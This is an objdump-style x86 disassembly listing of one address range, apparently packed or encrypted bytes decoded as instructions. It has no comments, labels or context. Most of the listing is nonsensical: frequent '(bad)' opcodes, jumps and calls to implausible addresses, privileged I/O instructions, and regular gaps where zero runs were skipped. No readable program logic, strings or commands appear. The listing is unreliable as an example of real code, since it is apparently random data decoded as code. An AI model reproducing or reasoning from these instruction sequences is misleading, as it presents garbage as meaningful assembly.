  40ce13:	cmp    edx,DWORD PTR [ecx]
  40ce15:	leave  
  40ce16:	add    BYTE PTR [ecx],cl
  40ce18:	test   eax,0x3f190dc8
  40ce1d:	and    DWORD PTR [ecx-0x1a],ebp
  40ce20:	stc    
  40ce21:	dec    edi
  40ce22:	add    edi,DWORD PTR [esi+0x6b298cf5]
  40ce28:	jmp    0xec65bbf5
  40ce2d:	stc    
  40ce2e:	and    ch,bh
  40ce30:	dec    eax
  40ce31:	fisub  WORD PTR [ebx]
  40ce33:	and    eax,0xa42c8d1
  40ce38:	leave  
  40ce39:	dec    esi
  40ce3a:	loope  0x40ce57
  40ce3c:	std    
  40ce3d:	leave  
  40ce3e:	lds    esp,FWORD PTR [esp]
  40ce41:	jl     0x40ce01
  40ce43:	scas   al,BYTE PTR es:[edi]
  40ce44:	cmp    DWORD PTR [ebx-0x3756da91],esi
  40ce4a:	inc    edx
  40ce4b:	or     BYTE PTR [ecx-0x16e40eb2],ah
  40ce51:	leave  
  40ce52:	popf   
  40ce53:	and    al,0x26
  40ce55:	push   0xc989c335
  40ce5a:	rcl    DWORD PTR [ebp-0xa],cl
  40ce5d:	sbb    ecx,ebp
  40ce5f:	and    al,0xf3
  40ce61:	push   edx
  40ce62:	xchg   ecx,eax
  40ce63:	repnz add BYTE PTR [eax],al
	...
  40ce8e:	jb     0x40ce58
  40ce90:	push   DWORD PTR [ebp-0x3b]
  40ce93:	imul   ebx,DWORD PTR [eax+ebp*1+0x3a],0x3de90233
  40ce9b:	(bad)  
  40ce9d:	aam    0x55
  40ce9f:	rcr    BYTE PTR [esi],0x54
  40cea2:	and    cl,al
  40cea4:	(bad)  
  40cea5:	aam    0x19
  40cea7:	enter  0xf174,0x55
  40ceab:	mov    ebx,DWORD PTR [esi+edi*1+0x205e285a]
  40ceb2:	jg     0x40cf13
  40ceb4:	add    BYTE PTR [esi+eiz*4+0x6d2d80b7],dl
  40cebb:	sar    dh,1
  40cebd:	push   ds
  40cebe:	mov    BYTE PTR [esi],bl
  40cec0:	cld    
  40cec1:	mov    ecx,0xe104e62
  40cec6:	rcl    BYTE PTR [ebx-0x18],1
  40cec9:	das    
  40ceca:	ja     0x40cf27
  40cecc:	add    dl,dh
  40cece:	jge    0x40cf28
  40ced0:	test   DWORD PTR [ebx+0x26005b3f],ebp
  40ced6:	mov    al,ds:0x3de8ffcf
  40cedb:	pop    ebx
  40cedc:	(bad)  
  40cedd:	and    al,0x36
  40cedf:	enter  0xe906,0x3d
  40cee3:	xor    eax,0x353a4300
  40cee8:	add    BYTE PTR [ebx+0x42],dl
  40ceeb:	(bad)  
  40ceec:	inc    esp
  40ceed:	mov    ch,0xea
  40ceef:	(bad)  
  40cef0:	test   BYTE PTR [ebp+0x0],bh
	...
  40cf1a:	add    BYTE PTR [eax],al
  40cf1c:	inc    ebp
  40cf1d:	enter  0x19fe,0x5d
  40cf21:	dec    esi
  40cf22:	clc    
  40cf23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf24:	mov    bh,0xc3
  40cf26:	out    0x81,eax
  40cf28:	rcr    BYTE PTR [edx+0x0],0xe2
  40cf2c:	std    
  40cf2d:	dec    esi
  40cf2e:	add    eax,0x5d3780
  40cf33:	add    BYTE PTR [edi-0xd],ah
  40cf36:	mov    BYTE PTR [eax+0x26],cl
  40cf39:	pop    edi
  40cf3a:	push   DWORD PTR [ebp-0x79]
  40cf3d:	jae    0x40cf28
  40cf3f:	mov    eax,ds:0x8b507bd0
  40cf44:	pop    ss
  40cf45:	jmp    0x50ff:0x7be8f484
  40cf4c:	test   DWORD PTR [ebx-0x27],esi
  40cf4f:	mov    eax,ds:0x85897bf0
  40cf54:	ja     0x40cfb8
  40cf56:	(bad)  
  40cf57:	dec    DWORD PTR [edi+0x70ff9cca]
  40cf5d:	cmc    
  40cf5e:	(bad)  
  40cf5f:	fiadd  DWORD PTR ds:0x40
  40cf64:	pusha  
  40cf65:	and    al,0xf0
  40cf67:	div    DWORD PTR [eax]
  40cf69:	jp     0x40cf6a
  40cf6b:	jne    0x40cf90
  40cf6d:	jae    0x40cfa1
  40cf6f:	mov    eax,ds:0x85897a30
  40cf74:	dec    ebx
  40cf75:	(bad)  
  40cf76:	(bad)  
  40cf77:	dec    ebp
  40cf79:	pop    edx
  40cf7a:	push   0xfe9fd34e
  40cf7f:	inc    BYTE PTR [eax]
	...
  40cfa9:	add    BYTE PTR [edx],ch
  40cfab:	outs   dx,DWORD PTR ds:[esi]
  40cfac:	idiv   edi
  40cfae:	loopne 0x40d029
  40cfb0:	jne    0x40cfbe
  40cfb2:	out    dx,eax
  40cfb3:	rcr    DWORD PTR [edi-0x7b280f01],0xec
  40cfba:	call   0xa7abcf38
  40cfbf:	repnz push ebp
  40cfc1:	pop    esp
  40cfc2:	pop    di
  40cfc4:	push   DWORD PTR [ebp-0x9e19]
  40cfca:	shl    bl,1
  40cfcc:	or     ch,al
  40cfce:	jecxz  0x40d00a
  40cfd0:	(bad)  
  40cfd1:	dec    DWORD PTR [esi]
  40cfd3:	shl    edi,cl
  40cfd5:	idiv   DWORD PTR [esi]
  40cfd7:	in     eax,dx
  40cfd8:	and    DWORD PTR [edx+0x3e],ebp
  40cfdb:	pop    esp
  40cfdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfdd:	pop    ebx
  40cfde:	push   DWORD PTR [ebx+0x4d6eb521]
  40cfe4:	and    bh,bh
  40cfe6:	imul   eax,edi,0x145fe80e
  40cfec:	and    bh,bh
  40cfee:	(bad)  
  40cfef:	aaa    
  40cff0:	aas    
  40cff1:	not    DWORD PTR [ecx+0x25]
  40cff4:	nop
  40cff5:	test   DWORD PTR [esi+0x25],ebx
  40cff8:	and    bh,bh
  40cffa:	out    dx,al
  40cffb:	fwait
  40cffc:	xchg   edx,eax
  40cffd:	pop    ebx
  40cffe:	jg     0x40cfb4
  40d000:	and    DWORD PTR [ebp-0xdd72d2],esi
  40d006:	sub    edi,eax
  40d008:	jo     0x40d052
  40d00a:	jg     0x40cfc0
  40d00c:	sub    bh,BYTE PTR [esi+0x0]
	...
  40d036:	add    BYTE PTR [eax],al
  40d038:	fidivr WORD PTR [edx+eiz*1+0xb]
  40d03c:	(bad)  
  40d03d:	out    dx,eax
  40d03e:	sti    
  40d03f:	or     bl,0x53
  40d042:	sbb    bh,bh
  40d044:	add    eax,eax
  40d046:	xchg   edi,eax
  40d047:	psubw  mm0,QWORD PTR [ebx]
  40d04a:	xchg   edx,eax
  40d04b:	test   DWORD PTR [esi],edx
  40d04d:	int    0x20
  40d04f:	dec    DWORD PTR [esi-0x1e6271a4]
  40d055:	mov    ah,0x2c
  40d057:	adc    al,0x45
  40d059:	hlt    
  40d05a:	xchg   edi,eax
  40d05b:	add    eax,0x9ca0ac6e
  40d060:	leave  
  40d061:	lods   al,BYTE PTR ds:[esi]
  40d062:	dec    eax
  40d063:	test   esi,esp
  40d065:	lods   al,BYTE PTR ds:[esi]
  40d066:	and    bh,bh
  40d068:	push   ebx
  40d069:	mov    ah,0x2
  40d06b:	add    bl,al
  40d06d:	ds xor al,0xf7
  40d070:	test   eax,0x2567b40c
  40d075:	pop    eax
  40d076:	ret    
  40d077:	call   FWORD PTR [eax-0x76eba3a6]
  40d07d:	lds    ebx,FWORD PTR [ebp-0x7ea8ecdf]
  40d083:	xchg   ebp,eax
  40d084:	mov    eax,ds:0xc38b8dc5
  40d089:	scas   al,BYTE PTR es:[edi]
  40d08a:	jge    0x40d0ad
  40d08c:	jno    0x40d067
  40d08e:	cmp    ebp,DWORD PTR [eax]
  40d090:	jno    0x40d057
  40d092:	jne    0x40d098
  40d094:	xor    edi,ebx
  40d096:	push   ecx
  40d097:	add    al,0x3e
  40d099:	pop    ebx
  40d09a:	push   0x5f
	...
  40d0c4:	add    BYTE PTR [eax],al
  40d0c6:	(bad)  
  40d0c7:	int    0x5d
  40d0c9:	and    DWORD PTR [esi],edi
  40d0cb:	push   esi
  40d0cc:	ins    DWORD PTR es:[edi],dx
  40d0cd:	xchg   edx,eax
  40d0ce:	ds pop ebx
  40d0d0:	jmp    0x3df4cc59
  40d0d5:	and    DWORD PTR [ecx],esi
  40d0d7:	pop    esp
  40d0d8:	out    dx,al
  40d0d9:	xchg   DWORD PTR [edi-0x69fc16a5],edi
  40d0df:	imul   ebp,ecx,0x30
  40d0e2:	fadd   st,st(4)
  40d0e4:	fwait
  40d0e5:	or     esp,DWORD PTR [esi]
  40d0e7:	stos   BYTE PTR es:[edi],al
  40d0e8:	jg     0x40d10b
  40d0ea:	or     ebp,eax
  40d0ec:	pop    ebx
  40d0ed:	xor    BYTE PTR [ecx],cl
  40d0ef:	lds    ecx,FWORD PTR ds:0x11537321
  40d0f5:	jmp    0xb3b3:0x20fdc4d7
  40d0fc:	std    
  40d0fd:	and    cl,ah
  40d0ff:	les    esi,FWORD PTR [ebx+0xb]
  40d102:	out    0x63,al
  40d104:	and    DWORD PTR [eax],0xffffffd1
  40d107:	les    edx,FWORD PTR [ebx-0x2a3b2ed9]
  40d10d:	and    BYTE PTR [ebx+0x53],cl
  40d110:	ror    DWORD PTR ds:0x20c5c4d4,0xeb
  40d117:	mov    ds:0xc4a920b5,eax
  40d11c:	(bad)  
  40d11d:	cmp    esi,DWORD PTR [edx]
  40d11f:	mov    bl,0x99
  40d121:	push   eax
  40d122:	pop    esi
  40d123:	(bad)  
  40d124:	(bad)  
  40d125:	pop    esp
  40d126:	push   ecx
  40d127:	int3   
  40d128:	(bad)  
  40d129:	sahf   
	...
  40d152:	add    BYTE PTR [eax],al
  40d154:	pop    esi
  40d155:	dec    esi
  40d156:	or     BYTE PTR [ecx-0x71011db1],al
  40d15c:	ret    0xd406
  40d15f:	jle    0x40d17f
  40d161:	(bad)  
  40d162:	push   esp
  40d164:	push   0xffffffd9
  40d166:	mov    esp,0xfec44699
  40d16b:	in     eax,0xb0
  40d16d:	push   0xffffff8b
  40d16f:	ins    BYTE PTR es:[edi],dx
  40d170:	or     esp,ecx
  40d172:	(bad)  
  40d173:	pop    esi
  40d174:	push   ds
  40d175:	mov    edi,edi
  40d177:	fdiv   QWORD PTR ds:0x5e7069b3
  40d17d:	(bad)  
  40d17e:	jmp    0x35b4:0xfdc3e3f3
  40d185:	mov    bl,0x5d
  40d187:	push   eax
  40d188:	pop    esi
  40d189:	(bad)  
  40d18a:	(bad)  
  40d18b:	je     0x40d1ee
  40d18d:	int3   
  40d18e:	(bad)  
  40d18f:	es gs stc 
  40d192:	fwait
  40d193:	push   ds
  40d194:	pop    esi
  40d195:	les    esi,FWORD PTR [ebp+eax*1+0x1fec426]
  40d19c:	jbe    0x40d185
  40d19e:	inc    BYTE PTR [esi]
  40d1a0:	push   ds
  40d1a1:	push   cs
  40d1a2:	call   0xe8051b9d
  40d1a7:	gs popa 
  40d1a9:	(bad)  
  40d1aa:	(bad)  
  40d1ab:	out    dx,al
  40d1ac:	jae    0x40d155
  40d1ae:	mul    dh
  40d1b0:	xor    DWORD PTR [ebx-0x3bd68280],esi
  40d1b6:	(bad)  
  40d1b7:	pushf  
	...
  40d1e0:	add    BYTE PTR [eax],al
  40d1e2:	push   es
  40d1e3:	int3   
  40d1e4:	dec    dh
  40d1e6:	push   0x4d
  40d1e8:	pushf  
  40d1e9:	add    BYTE PTR [eax+0x63],bh
  40d1ec:	push   DWORD PTR [ebp-0x9419]
  40d1f2:	call   0x533fdcd8
  40d1f7:	push   edi
  40d1f8:	call   0xffa4acb6
  40d1fd:	push   edx
  40d1ff:	outs   dx,BYTE PTR ds:[esi]
  40d200:	idiv   edi
  40d202:	test   al,0x76
  40d204:	pop    edx
  40d205:	pushf  
  40d206:	enter  0xff63,0x45
  40d20a:	mov    edi,0xe8fdcd75
  40d20f:	arpl   di,di
  40d211:	jne    0x40d1fe
  40d213:	jbe    0x40d28b
  40d215:	mov    BYTE PTR [edi+0x57],ah
  40d218:	leave  
  40d219:	ret    0x574b
  40d21c:	push   ebp
  40d21d:	mov    edi,ebx
  40d21f:	xlat   BYTE PTR ds:[ebx]
  40d220:	ret    
  40d221:	cld    
  40d222:	jge    0x40d27b
  40d224:	push   0x1c
  40d226:	mov    ah,ah
  40d228:	push   es
  40d229:	call   0x401239
  40d22e:	scas   al,BYTE PTR es:[edi]
  40d22f:	xchg   esp,eax
  40d230:	cli    
  40d231:	push   0x3f9b91
  40d236:	push   0xe648aca4
  40d23b:	pop    esi
  40d23c:	push   DWORD PTR [ebp+0xf]
  40d23f:	ja     0x40d2b3
  40d241:	std    
  40d242:	sub    BYTE PTR [edx+0x68],ah
  40d245:	xchg   BYTE PTR [eax],al
	...
  40d26f:	add    BYTE PTR [ebx-0x1a980169],ch
  40d275:	pop    esi
  40d276:	add    BYTE PTR [eax-0x17f91c18],al
  40d27c:	mov    bh,0x7b
  40d27e:	(bad)  
  40d27f:	(bad)  
  40d280:	call   0x7340cd68
  40d285:	dec    edi
  40d286:	call   0xffa2910a
  40d28b:	leave  
  40d28c:	test   BYTE PTR ds:[esi],0x0
  40d290:	adc    edi,DWORD PTR ds:0x7a812f
  40d296:	sbb    eax,0x42ea9ff
  40d29b:	push   0x43
  40d29d:	or     DWORD PTR [eax+0x7d54a607],ebx
  40d2a3:	call   DWORD PTR [ecx+0x16fbc84b]
  40d2a9:	mov    eax,0x373e0003
  40d2ae:	mov    bh,dh
  40d2b0:	js     0x40d283
  40d2b2:	sbb    eax,0x85c26650
  40d2b7:	add    BYTE PTR [esi],bh
  40d2b9:	int    0x42
  40d2bb:	je     0x40d2cf
  40d2bd:	pop    es
  40d2be:	pop    es
  40d2bf:	add    DWORD PTR [esi],edi
  40d2c1:	mov    ah,0x95
  40d2c3:	and    al,0xe6
  40d2c5:	fnstcw WORD PTR [esi-0x77d0c1c0]
  40d2cb:	test   DWORD PTR [eax+0x29],0x926501e
  40d2d2:	jle    0x40d2d3
	...
  40d2fc:	add    BYTE PTR [eax],al
  40d2fe:	xor    esp,esp
  40d300:	stos   BYTE PTR es:[edi],al
  40d301:	jmp    FWORD PTR [ecx]
  40d303:	adc    DWORD PTR [ebp+0x50],ebx
  40d306:	and    edi,edi
  40d308:	or     ch,al
  40d30a:	shl    BYTE PTR [edx+0x1e],1
  40d30d:	jmp    DWORD PTR [esi]
  40d30f:	adc    BYTE PTR [edx-0x1],bh
  40d312:	or     DWORD PTR [ecx-0x68],esp
  40d315:	sti    
  40d316:	add    edi,ebx
  40d318:	or     ch,al
  40d31a:	push   ecx
  40d31b:	dec    ebx
  40d31c:	push   ds
  40d31d:	inc    DWORD PTR [edi]
  40d31f:	jbe    0x40d328
  40d321:	add    BYTE PTR [ebx-0x57cd0b3],dl
  40d327:	(bad)  
  40d328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d329:	jmp    DWORD PTR [edi-0x6e]
  40d32c:	sbb    eax,0xd15b4675
  40d331:	pop    ecx
  40d332:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d333:	rcr    ebp,0x8b
  40d336:	jnp    0x40d2f7
  40d338:	inc    eax
  40d339:	add    al,0x3e
  40d33b:	mov    dl,0x8e
  40d33d:	lods   al,BYTE PTR ds:[esi]
  40d33e:	in     eax,0x1e
  40d340:	sub    BYTE PTR [esi+edx*1],al
  40d343:	add    ebx,DWORD PTR ds:0x3bc0a1c3
  40d349:	or     al,0xa6
  40d34b:	clc    
  40d34c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d34d:	sbb    eax,0x201bc191
  40d352:	mov    DWORD PTR [edi-0xf],eax
  40d355:	sub    esp,DWORD PTR [edx-0x1e]
  40d358:	xchg   ebp,eax
  40d359:	sbb    eax,0x3e49c87
  40d35e:	or     edx,esi
  40d360:	xchg   esp,eax
  40d361:	add    DWORD PTR [eax],0x0
	...
  40d38c:	and    BYTE PTR [esi-0x309ee28b],0x2b
  40d393:	and    dh,ch
  40d395:	shl    ebx,0xf3
  40d398:	push   eax
  40d399:	inc    edi
  40d39a:	cmc    
  40d39b:	sub    edx,edx
  40d39d:	fld1   
  40d39f:	add    esi,DWORD PTR ds:0x3286e59b
  40d3a5:	pop    ebx
  40d3a6:	jmp    0x4157ccae
  40d3ab:	add    al,0x3e
  40d3ad:	pop    ebx
  40d3ae:	jmp    0x36084ef7
  40d3b3:	add    eax,0x3c35b3e
  40d3b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3b9:	pop    ebx
  40d3ba:	xchg   ebx,eax
  40d3bb:	add    edx,DWORD PTR [ebx+ebx*2+0x2c0dc76c]
  40d3c2:	fs xchg edx,esi
  40d3c5:	enter  0x1d0d,0x8e
  40d3c9:	sar    BYTE PTR [ebx+0x1b],0xe9
  40d3cd:	inc    esi
  40d3ce:	std    
  40d3cf:	sub    edi,DWORD PTR [eax-0x28]
  40d3d2:	(bad)  
  40d3d3:	call   0x76012815
  40d3d8:	cmp    BYTE PTR [edx+0x5b3de8b6],dh
  40d3de:	push   0x1bf573
  40d3e3:	(bad)  
  40d3e4:	rcl    BYTE PTR [eax-0x18],1
  40d3e7:	jbe    0x40d41c
  40d3e9:	sar    dh,0x19
  40d3ec:	mov    bh,0xab
  40d3ee:	mov    WORD PTR [eax+eax*1+0x0],fs
	...
  40d41a:	dec    ecx
  40d41b:	enter  0xb6fe,0xcd
  40d41f:	sub    ch,al
  40d421:	adc    ax,ax
  40d424:	(bad)  
  40d425:	jo     0x40d3e7
  40d427:	retf   
  40d428:	neg    BYTE PTR [esi+0x73dcb322]
  40d42e:	pop    edx
  40d42f:	ror    BYTE PTR [esp+eiz*2-0x790137e3],0xad
  40d437:	cmp    dl,al
  40d439:	sbb    eax,0x3cfdc07d
  40d43e:	sub    eax,0x326efec8
  40d443:	inc    esi
  40d444:	or     al,0x51
  40d446:	push   es
  40d447:	fdivp  st(6),st
  40d449:	pop    esi
  40d44a:	mov    ah,0xd6
  40d44c:	jecxz  0x40d4ac
  40d44e:	pop    edx
  40d44f:	shr    BYTE PTR [ecx-0x17],0xe5
  40d453:	xchg   esp,eax
  40d454:	pop    ebx
  40d455:	test   al,0x3d
  40d457:	shl    BYTE PTR [ecx+edi*1+0x36fec04a],0xb0
  40d45f:	push   ebx
  40d460:	call   0xff01648e
  40d465:	jo     0x40d427
  40d467:	scas   al,BYTE PTR es:[edi]
  40d468:	neg    BYTE PTR [esi]
  40d46a:	and    dh,BYTE PTR ds:0x1f8a8100
  40d470:	inc    ecx
  40d471:	jmp    0x130dac8
  40d476:	call   0x6b40d3de
  40d47b:	push   eax
  40d47c:	call   0x40d526
	...
  40d4a5:	add    BYTE PTR [eax],al
  40d4a7:	add    BYTE PTR [edx+0x5f],dh
  40d4aa:	dec    DWORD PTR [ecx-0x88ba6]
  40d4b0:	loopne 0x40d4a2
  40d4b2:	(bad)  
  40d4b3:	inc    DWORD PTR [bp+si]
  40d4b6:	inc    eax
  40d4b7:	add    BYTE PTR [eax-0x7f080fd7],dl
  40d4bd:	arpl   di,di
  40d4bf:	jne    0x40d474
  40d4c1:	jae    0x40d44d
  40d4c3:	popf   
  40d4c4:	loopne 0x40d529
  40d4c6:	mov    DWORD PTR [ebp-0x944d],eax
  40d4cc:	std    
  40d4cd:	push   esi
  40d4ce:	push   0xfe9603e6
  40d4d3:	(bad)  
  40d4d4:	jmp    0x7563:0xd0fff766
  40d4db:	or     al,0xbf
  40d4dd:	repz fwait
  40d4df:	inc    eax
  40d4e1:	int    0x84
  40d4e3:	fsubr  st,st(0)
  40d4e5:	arpl   di,di
  40d4e7:	push   0x67
  40d4e9:	repz and BYTE PTR [ebp+0x26],bl
  40d4ed:	push   edi
  40d4ee:	push   DWORD PTR [ebp-0x9419]
  40d4f4:	loopne 0x40d4df
  40d4f6:	or     ch,al
  40d4f8:	sti    
  40d4f9:	inc    ebx
  40d4fa:	(bad)  
  40d4fb:	call   FWORD PTR [esi-0x7f082c24]
  40d501:	bound  eax,QWORD PTR [ebx-0x958443]
  40d507:	jmp    DWORD PTR [edi]
  40d509:	iret   
  40d50a:	ja     0x40d48f
	...
  40d534:	add    BYTE PTR [eax],al
  40d536:	mov    ds:0x60fff773,al
  40d53b:	push   edi
  40d53c:	je     0x40d5ae
  40d53e:	xchg   esp,eax
  40d53f:	and    al,0xe8
  40d541:	idiv   DWORD PTR [esi]
  40d543:	sbb    eax,DWORD PTR gs:[eax]
  40d546:	push   0xffffffd5
  40d548:	stos   BYTE PTR es:[edi],al
  40d549:	(bad)  
  40d54b:	gs pop edx
  40d54d:	jmp    FWORD PTR [ebx-0x34]
  40d550:	sub    bh,BYTE PTR [edi-0xe63a50]
  40d556:	mov    eax,eax
  40d558:	adc    edi,edi
  40d55a:	leave  
  40d55b:	mov    ch,0x8f
  40d55d:	pop    es
  40d55e:	(bad)  
  40d55f:	shl    DWORD PTR [ecx-0x1],0xb9
  40d563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d564:	dec    edi
  40d565:	call   0xff5a6313
  40d56a:	xor    ecx,esp
  40d56c:	sub    al,BYTE PTR ds:0xff19fdc9
  40d572:	rcl    DWORD PTR [ecx+edx*1+0x4fed91ff],cl
  40d579:	in     al,0x91
  40d57b:	cmc    
  40d57c:	sbb    edi,edi
  40d57e:	or     ecx,esp
  40d580:	sub    al,ch
  40d582:	shl    ch,1
  40d584:	sbb    edi,edi
  40d586:	stos   DWORD PTR es:[edi],eax
  40d587:	or     al,0x12
  40d589:	jmp    FWORD PTR [ecx-0x2b]
  40d58c:	pop    DWORD PTR [edi]
  40d58e:	push   esi
  40d58f:	shl    DWORD PTR [eax-0x1],1
  40d592:	pop    ecx
  40d593:	inc    ebp
  40d594:	push   eax
  40d595:	fmul   QWORD PTR [ecx+0x2d]
  40d598:	sbb    bh,bh
	...
  40d5c2:	add    BYTE PTR [eax],al
  40d5c4:	ror    ebx,cl
  40d5c6:	sub    dl,ch
  40d5c8:	test   al,0x1d
  40d5ca:	sbb    bh,bh
  40d5cc:	repz jg 0x40d5e1
  40d5cf:	push   DWORD PTR [ecx]
  40d5d1:	or     eax,0x6d160790
  40d5d6:	jno    0x40d5d7
  40d5d8:	and    DWORD PTR [ebp+0x50],edi
  40d5db:	in     al,0x11
  40d5dd:	test   DWORD PTR [edx],ebx
  40d5df:	call   0xff5b00cb
  40d5e4:	or     DWORD PTR [ebx+0x5c],ebx
  40d5e7:	daa    
  40d5e8:	or     DWORD PTR [esi-0x1c27d4e3],edi
  40d5ee:	adc    eax,0x107f11a
  40d5f3:	adc    ch,cl
  40d5f5:	mov    ebp,0xbdc77610
  40d5fa:	std    
  40d5fb:	sbb    DWORD PTR [ebx-0x2ee60262],edx
  40d601:	mov    dl,0x60
  40d603:	jl     0x40d5ce
  40d605:	mov    ebp,0xc5e64fe5
  40d60a:	fstp   QWORD PTR [ecx]
  40d60c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d60d:	aas    
  40d60e:	jo     0x40d629
  40d610:	mov    cl,0xbd
  40d612:	xchg   ebx,eax
  40d613:	xor    BYTE PTR [ecx+0x2c2cc5bd],dh
  40d619:	in     al,0xbd
  40d61b:	sbb    DWORD PTR [ecx-0x6eee46f9],ebx
  40d621:	mov    ebp,0xbe358fad
  40d626:	sbb    ecx,DWORD PTR [eax+eax*1]
	...
  40d651:	add    BYTE PTR [esi+0x79199f55],dl
  40d657:	mov    ebp,0xbd69145b
  40d65c:	lea    ebp,[eax+edx*1]
  40d65f:	in     al,0x85
  40d661:	sbb    DWORD PTR [ecx+0x17],esp
  40d664:	sub    DWORD PTR [ebx],0x1975bd35
  40d66a:	push   ecx
  40d66b:	inc    edi
  40d66c:	ins    DWORD PTR es:[edi],dx
  40d66d:	sub    al,0xcc
  40d66f:	xlat   BYTE PTR ds:[ebx]
  40d670:	call   0xecd94d78
  40d675:	add    edx,DWORD PTR [ebx-0x57abb30]
  40d67b:	mov    edi,0x5c9403c2
  40d680:	inc    esi
  40d681:	(bad)  
  40d682:	cmp    DWORD PTR [ebx-0x42e68e30],esi
  40d688:	call   FWORD PTR [edi-0x2f]
  40d68b:	shl    BYTE PTR [edi+0x42],0xc6
  40d68f:	sbb    eax,DWORD PTR [eax]
  40d691:	es icebp 
  40d693:	out    dx,al
  40d694:	inc    edi
  40d695:	test   al,0x3d
  40d697:	mov    esp,0x9b25e174
  40d69c:	cld    
  40d69d:	push   cs
  40d69e:	inc    edi
  40d69f:	xor    ebp,ebx
  40d6a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6a2:	cld    
  40d6a3:	mov    esp,0x5b3deb66
  40d6a8:	xor    dh,0xc0
  40d6ab:	push   esp
  40d6ac:	call   0xfefd07f0
  40d6b1:	out    0xb0,al
  40d6b3:	sar    dh,0x54
	...
  40d6de:	add    BYTE PTR [eax],al
  40d6e0:	dec    edx
  40d6e1:	mov    bl,0x7a
  40d6e3:	jg     0x40d73b
  40d6e5:	mov    esp,0xbca9abc8
  40d6ea:	push   ebx
  40d6eb:	jb     0x40d746
  40d6ed:	fadd   st,st(3)
  40d6ef:	mov    ebp,0xe96a25cf
  40d6f4:	jecxz  0x40d752
  40d6f6:	push   DWORD PTR [edx+edi*1]
  40d6f9:	mov    bl,0x1c
  40d6fb:	jg     0x40d723
  40d6fd:	mov    esp,0xd0562488
  40d702:	xor    al,0xdb
  40d704:	test   DWORD PTR [ebx],ebx
  40d706:	add    BYTE PTR [edx-0x70],ah
  40d709:	xchg   BYTE PTR [eax+0x28],cl
  40d70c:	cmp    bl,bl
  40d70e:	ds jmp 0xb0a912dd
  40d714:	mov    BYTE PTR [ebx],bl
  40d716:	add    BYTE PTR [edi],dl
  40d718:	sbb    al,BYTE PTR [ecx+0x2b3de985]
  40d71e:	push   0x1af10c
  40d723:	mov    esi,0xe9856d65
  40d728:	cmp    eax,0x57000b21
  40d72d:	int    0x2
  40d72f:	or     esi,DWORD PTR ds:0x7f5628cc
  40d735:	in     eax,0xa0
  40d737:	call   FWORD PTR [eax-0x10]
  40d73a:	inc    ebx
  40d73b:	pop    ebp
  40d73c:	(bad)  
  40d73d:	push   edi
  40d73e:	push   eax
  40d73f:	call   0x401bb8
	...
  40d76c:	add    BYTE PTR [eax],al
  40d76e:	mov    bh,0xef
  40d770:	(bad)  
  40d771:	(bad)  
  40d772:	call   0x9a813f99
  40d777:	cwde   
  40d778:	dec    BYTE PTR [edi-0x28]
  40d77b:	int    0x6
  40d77d:	call   0x3ff0cb
  40d782:	aas    
  40d783:	fist   DWORD PTR [edi+0x16fd8ff]
  40d789:	inc    esi
  40d78a:	daa    
  40d78b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d78c:	(bad)  
  40d78d:	je     0x40d71c
  40d78f:	cld    
  40d790:	cli    
  40d791:	xor    edx,edi
  40d793:	sbb    eax,0x6378ffff
  40d798:	repnz scas al,BYTE PTR es:[edi]
  40d79a:	aas    
  40d79b:	mov    esp,0xe9c89f73
  40d7a0:	cli    
  40d7a1:	call   DWORD PTR [edx+0x4f]
  40d7a4:	call   0xffa4da8c
  40d7a9:	pop    edi
  40d7aa:	cmp    DWORD PTR [esi],ecx
  40d7ac:	ret    0x6704
  40d7af:	or     cl,BYTE PTR [edx-0x3e52b14]
  40d7b5:	jmp    DWORD PTR [edx+0x53]
  40d7b8:	push   DWORD PTR [ebp+0x4f]
  40d7bb:	outs   dx,DWORD PTR ds:[esi]
  40d7bc:	cli    
  40d7bd:	xchg   edx,eax
  40d7be:	enter  0x8963,0x45
  40d7c2:	(bad)  [ebx+0x75]
  40d7c5:	cld    
  40d7c6:	fsubr  st,st(1)
  40d7c8:	push   es
  40d7c9:	call   0x4006cb
  40d7ce:	ds cmp eax,0xbc9
	...
  40d7fc:	xor    eax,0xbd419084
  40d801:	pop    ebx
  40d802:	add    al,0x74
  40d804:	pop    ebx
  40d805:	jns    0x40d798
  40d807:	sti    
  40d808:	es push es
  40d80a:	jnp    0x40d80b
  40d80c:	or     ebp,edx
  40d80e:	adc    eax,0x91813275
  40d813:	sti    
  40d814:	mov    ds,WORD PTR [ecx-0x6f]
  40d817:	pop    es
  40d818:	out    0x26,al
  40d81a:	jb     0x40d81b
  40d81c:	jmp    0x328e620f
  40d821:	inc    ebp
  40d822:	(bad)  
  40d824:	push   edx
  40d825:	scas   al,BYTE PTR es:[edi]
  40d826:	mov    al,0xe7
  40d828:	inc    ebx
  40d829:	or     al,0x17
  40d82b:	call   DWORD PTR ds:0xbd142b84
  40d831:	aas    
  40d832:	hlt    
  40d833:	jmp    FWORD PTR ds:0x4e4589ac
  40d839:	xchg   ecx,eax
  40d83a:	(bad)  
  40d83b:	sti    
  40d83c:	mov    ecx,0x95c289c4
  40d841:	(bad)  
  40d842:	jmp    0x7476006
  40d847:	add    bl,ch
  40d849:	cmp    al,0x27
  40d84b:	call   DWORD PTR [ebx]
  40d84d:	cwde   
  40d84e:	adc    eax,0x85cc3675
  40d853:	xchg   edx,eax
  40d854:	jns    0x40d82f
  40d856:	adc    eax,0x17744275
  40d85b:	jne    0x40d893
  40d85d:	fdiv   st(5),st
  40d85f:	xchg   edx,eax
	...
  40d888:	add    BYTE PTR [eax],al
  40d88a:	popa   
  40d88b:	loope  0x40d8d8
  40d88d:	ret    0xc446
  40d890:	scas   eax,DWORD PTR es:[edi]
  40d891:	mov    ah,BYTE PTR [edx+0x45]
  40d894:	aas    
  40d895:	shl    al,0x50
  40d898:	mov    bl,0x82
  40d89a:	ret    
  40d89b:	pop    edx
  40d89c:	icebp  
  40d89d:	add    esi,DWORD PTR [edx+0x45986a4d]
  40d8a3:	pop    ebx
  40d8a4:	fld    QWORD PTR [edi]
  40d8a6:	mov    ebp,0xaa03f937
  40d8ab:	popa   
